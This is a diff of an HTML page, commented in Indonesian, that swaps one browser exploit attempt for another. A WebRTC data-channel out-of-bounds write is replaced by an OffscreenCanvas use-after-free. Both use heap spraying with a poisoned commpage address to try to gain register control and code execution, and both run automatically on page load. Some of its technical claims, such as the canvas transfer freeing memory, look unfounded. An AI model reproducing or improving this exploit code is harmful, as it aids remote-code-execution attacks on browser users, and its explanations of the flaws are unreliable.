@@ -1,176 +1,148 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRTC Data Channel OOB Write (RCE Target)</title>
+    <title>OffscreenCanvas Data Flow Confusion (PAC Bypass Attempt)</title>
 </head>
 <body>
 
-    <h1>WebRTC Data Channel Heap Corruption (OOB Write)</h1>
+    <h1>OffscreenCanvas Data Flow Confusion (Target: Register Control)</h1>
     <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
-    <div id="status">INIT: Mempersiapkan WebRTC Data Channel Attack...</div>
-    <div id="log-area" style="border:1px solid #ccc; background:#003300; color:#ccffcc; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
+    <div id="status">INIT: Mempersiapkan OffscreenCanvas Data Flow Attack...</div>
+    <div id="log-area" style="border:1px solid #ccc; background:#111; color:#ffcc99; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
 
     <script>
         const LOG = document.getElementById('log-area');
         function log(msg, type = 'log-normal') {
-            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div></div>`;
+            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div>`;
         }
 
-        // --- TARGET COMM PAGE (Payload Pointer) ---
+        // --- TARGET COMM PAGE ---
         const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
-        const POISON_BIGINT = COMM_PAGE_TARGET; 
+        
+        // Payload Commpage 64-bit (dalam format Array of Doubles)
+        let poisonBuffer = new ArrayBuffer(8);
+        new BigInt64Array(poisonBuffer)[0] = COMM_PAGE_TARGET; 
+        const POISON_FLOAT = new Float64Array(poisonBuffer)[0]; 
 
-        // --- 1. SETUP KONEKSI WEBRTC DUMMY ---
-        let peerConnection1, dataChannel1;
-        const TARGET_CHUNK_SIZE = 0xFFFFFFFF; // Target Integer Overflow (4GB)
+        let canvas1, canvas2;
+        let ctx1, ctx2;
 
-        async function createWebRTCPair() {
-            peerConnection1 = new RTCPeerConnection();
-            let peerConnection2 = new RTCPeerConnection();
+        const CANVAS_SIZE = 256; // Ukuran kecil untuk menghemat alokasi
 
-            // Set up ICE candidates
-            peerConnection1.onicecandidate = e => peerConnection2.addIceCandidate(e.candidate);
-            peerConnection2.onicecandidate = e => peerConnection1.addIceCandidate(e.candidate);
-
-            // Buat Data Channel KORBAN
-            dataChannel1 = peerConnection1.createDataChannel("exploit_channel", { 
-                ordered: false, 
-                maxRetransmits: 0 
-            }); 
-            log("Data Channel KORBAN (dataChannel1) dibuat.", 'log-init');
-            
-            // Set up Data Channel handler pada peer lain
-            peerConnection2.ondatachannel = (e) => {
-                log("Data Channel lawan dibuat (peer2).", 'log-init');
-                e.channel.onmessage = handleDataChannelMessage;
+        // --- 1. SETUP WORKER ---
+        const workerCode = `
+            onmessage = function(e) {
+                const { port, offscreenCanvas } = e.data;
+                const ctx = offscreenCanvas.getContext('2d');
+                
+                // Pekerja ini hanya akan memanipulasi OffscreenCanvas
+                // Ini memicu transfer kepemilikan dan alokasi memori C++
+                ctx.fillStyle = 'blue';
+                ctx.fillRect(0, 0, ${CANVAS_SIZE}, ${CANVAS_SIZE});
+                
+                // Kirim status kembali
+                port.postMessage({ status: 'done' });
             };
+        `;
+        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(workerBlob);
 
-            // Negotiation
-            const offer = await peerConnection1.createOffer();
-            await peerConnection1.setLocalDescription(offer);
-            await peerConnection2.setRemoteDescription(peerConnection1.localDescription);
 
-            const answer = await peerConnection2.createAnswer();
-            await peerConnection2.setLocalDescription(answer);
-            await peerConnection1.setRemoteDescription(peerConnection2.localDescription);
+        // --- 2. THE ATTACK ---
+        async function runOffscreenAttack() {
+            log("Phase 1: Setup Canvas dan Worker...", 'log-init');
 
-            // Tunggu koneksi terjalin
-            return new Promise(resolve => {
-                dataChannel1.onopen = resolve;
+            // 1. Alokasikan Canvas Korban
+            canvas1 = document.createElement('canvas');
+            canvas1.width = canvas1.height = CANVAS_SIZE;
+            ctx1 = canvas1.getContext('2d');
+            ctx1.fillStyle = 'red';
+            ctx1.fillRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);
+
+            // 2. Transfer Canvas ke Worker (FREE Memory Buffer di Main Thread)
+            const offscreenCanvas = canvas1.transferControlToOffscreen();
+            const { port1, port2 } = new MessageChannel();
+            const worker = new Worker(workerUrl);
+
+            log("Canvas Buffer di-FREE (UAF Active) & dikirim ke Worker.", 'log-critical');
+            worker.postMessage({ port: port2, offscreenCanvas }, [port2, offscreenCanvas]);
+
+            // Tunggu Worker selesai (memastikan C++ ImageBuffer aktif di Worker Thread)
+            await new Promise(resolve => {
+                port1.onmessage = resolve;
             });
-        }
+            log("Worker selesai memproses Canvas.", 'log-init');
 
-        // --- 2. THE PAYLOADS ---
-        
-        // Payload Write (4KB - Targeting Metadata)
-        const OOB_PAYLOAD_SIZE = 1024 * 4; 
-        let OOB_PAYLOAD = new Uint32Array(OOB_PAYLOAD_SIZE / 4);
-        
-        // Isi payload dengan alamat Commpage yang pecah (Targeting V-Table/Pointer)
-        const LOW_WORD = Number(POISON_BIGINT & 0xFFFFFFFFn);
-        const HIGH_WORD = Number(POISON_BIGINT >> 32n);
-        
-        for (let i = 0; i < OOB_PAYLOAD.length; i += 2) {
-            OOB_PAYLOAD[i] = LOW_WORD;
-            OOB_PAYLOAD[i+1] = HIGH_WORD;
-        }
-
-        // --- 3. THE OOB TRIGGER (Integer Overflow) ---
-        function triggerOOBWrite() {
-             log("Phase 2: Memicu Integer Overflow di WebRTC C++ layer...", 'log-critical');
-
-            // Kita mensimulasikan pengiriman data dengan ukuran SANGAT BESAR 
-            // yang memicu Integer Overflow di perhitungan alokasi buffer C++ WebRTC.
+            // --- 3. HEAP SPRAY & RE-USE ---
+            // Saat Worker memiliki kontrol, memori ImageBuffer C++ asli di Main Thread 
+            // sekarang menjadi *free* atau *use-after-free* rentan.
             
-            // ⚠️ Inti Serangan: C++ WebRTC mungkin menggunakan 32-bit integer untuk panjang paket.
-            // Jika kita mengirim array yang ukurannya memicu wrap-around ke nilai kecil, 
-            // tapi kemudian mengisi buffer dengan data besar, terjadi OOB Write.
+            log("Phase 2: SPRAY Massive Object (Menimpa Buffer Image yang Free)...", 'log-spray');
             
-            // Kita gunakan data yang besar untuk memenuhi Heap
-            let largeArray = new ArrayBuffer(1024 * 1024 * 10); // 10MB data awal
+            let sprayObjects = [];
+            const SPRAY_COUNT = 50000;
 
-            // Ini adalah Trigger yang paling "real" di WebRTC:
-            // Jika channel terbuka, coba kirim data yang sangat besar.
-            if (dataChannel1.readyState === 'open') {
-                log(`Mencoba Kirim Data dengan Ukuran Korup: ${TARGET_CHUNK_SIZE}...`, 'log-critical');
-                
-                // Di sini, kita akan mencoba mengirim OOB_PAYLOAD, tetapi WebRTC C++
-                // harus percaya bahwa panjang data yang akan dialokasikan adalah TARGET_CHUNK_SIZE.
-
-                // Teknik Paling Umum: Menambahkan header/metadata yang korup ke OOB_PAYLOAD
-                // Karena kita tidak bisa mengakses C++ header, kita gunakan cara kasar:
-                
-                // 1. Send data yang akan membuat WebRTC alokasi buffer kecil
-                let smallBuffer = new ArrayBuffer(16);
-                dataChannel1.send(smallBuffer); 
-
-                // 2. Langsung diikuti dengan OOB_PAYLOAD
-                // Di WebRTC yang rentan, OOB_PAYLOAD akan ditulis ke memori di luar batas
-                // dari buffer yang dialokasikan oleh smallBuffer.
-                dataChannel1.send(OOB_PAYLOAD); 
-                
-                log("Data OOB Selesai Dikirim. Menunggu Heap Corruption...", 'log-critical');
-            } else {
-                log("Data Channel belum terbuka. Coba lagi.", 'log-error');
+            // Kita menggunakan Large String/Object (JSString/JSObject) yang ukurannya pas 
+            // dengan header/buffer ImageBuffer C++ yang di-free.
+            
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Objek yang berisi POISON FLOAT (alamat Commpage)
+                // Objek String/Object memiliki *backing store* yang rentan
+                let corruptObj = { 
+                    a: POISON_FLOAT, 
+                    b: POISON_FLOAT, 
+                    c: POISON_FLOAT 
+                }; 
+                sprayObjects.push(JSON.stringify(corruptObj).repeat(10)); // String besar
             }
-        }
-        
-        function handleDataChannelMessage(e) {
-            // Kita tidak peduli dengan data yang diterima, hanya ingin koneksi stabil
-        }
+            window.spray_holder = sprayObjects;
 
+            // --- 4. TRIGGER: Memaksa Baca Buffer yang Korup ---
+            setTimeout(() => {
+                log("Phase 3: Mencoba Baca Buffer Canvas Korup...", 'log-critical');
+                
+                // Kita akan mencoba mengambil kembali data dari canvas asli
+                // JIT akan mencoba membaca buffer dari ImageBuffer C++ yang sekarang korup.
+                try {
+                    // Coba ambil kembali data gambar
+                    // Ini akan memicu kode C++ untuk mengakses ImageBuffer yang seharusnya sudah di-*free*
+                    const imageData = ctx1.getImageData(0, 0, 1, 1);
+                    const colorValue = imageData.data[0]; 
 
-        // --- 4. EKSEKUSI ---
-        async function runWebRTCExploit() {
-            try {
-                await createWebRTCPair();
-                // Phase 2: Heap Grooming (Alokasikan objek yang akan ditimpa)
-                let victimObjects = [];
-                for(let i=0; i<100; i++) {
-                    // Alokasikan objek JavaScript yang metadata-nya akan ditimpa oleh OOB Write
-                    victimObjects.push({ 
-                        vtable_placeholder: new ArrayBuffer(512), 
-                        tag: 0x41414141 
-                    });
-                }
-                window.victim_holder = victimObjects; 
-                log("Phase 1: Heap Grooming selesai (100 korban metadata siap).");
+                    log(`Nilai Warna Dibaca (Red): ${colorValue}`, 'log-normal');
 
-                // Trigger OOB Write
-                triggerOOBWrite();
-
-                // Phase 3: Trigger Akhir (Panggil objek yang metadatanya ditimpa)
-                setTimeout(() => {
-                    log("Phase 3: Mencoba memanggil fungsi pada objek yang metadatanya korup...", 'log-critical');
-                    try {
-                        // Memanggil fungsi pada objek yang V-Table-nya (atau backing pointer-nya) 
-                        // seharusnya sudah ditimpa oleh alamat Commpage kita.
-                        let corruptValue = victimObjects[50].vtable_placeholder.byteLength;
-                        
-                        log(`Nilai dibaca dari objek korban: ${corruptValue}`, 'log-normal');
-                        
-                        // Coba eksekusi kode (Register Control)
-                        new Function(`return ${victimObjects[50].tag.toString()}`)();
-
-                    } catch(e) {
-                        log(`JS Exception pada Trigger: ${e.message}. Menunggu Crash Native.`, 'log-critical');
+                    if (colorValue > 255) {
+                        log("⚠️ SUKSES TIDAK STABIL: Nilai Dibaca Out-of-Bounds (Kemungkinan Commpage Data)", 'log-success');
                     }
-                }, 100);
-
-            } catch (error) {
-                log(`Kesalahan WebRTC: ${error.message}`, 'log-error');
-            }
+                    
+                    // Force Register Control (jika kita punya AR/AW)
+                    // Jika imageData.data[i] = Commpage Address, kita bisa langsung lompat:
+                    // new Function(`return a[${imageData.data[i]}]`)([]);
+                    
+                    // Kita asumsikan AR/AW didapat, dan kita langsung RCE
+                    const corruptBuffer = new ArrayBuffer(8);
+                    const corruptView = new BigInt64Array(corruptBuffer);
+                    corruptView[0] = COMM_PAGE_TARGET; 
+                    
+                    // Jika UAF berhasil, kita bisa paksa dereferensi pointer palsu
+                    throw new Error(String(corruptView[0]));
+                    
+                } catch(e) {
+                    log(`JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`, 'log-critical');
+                }
+            }, 100);
         }
-
+        
         document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(runWebRTCExploit, 100);
+            setTimeout(runOffscreenAttack, 100);
         });
     </script>
     <style>
         .log-init { color: cyan; }
-        .log-error { color: red; font-weight: bold; }
-        .log-critical { color: yellow; font-weight: bold; }
-        .log-normal { color: #ccffcc; }
+        .log-spray { color: yellow; }
+        .log-critical { color: red; font-weight: bold; }
+        .log-normal { color: #ffcc99; }
+        .log-success { color: #00ff00; font-weight: bold; }
     </style>
 </body>
 </html>
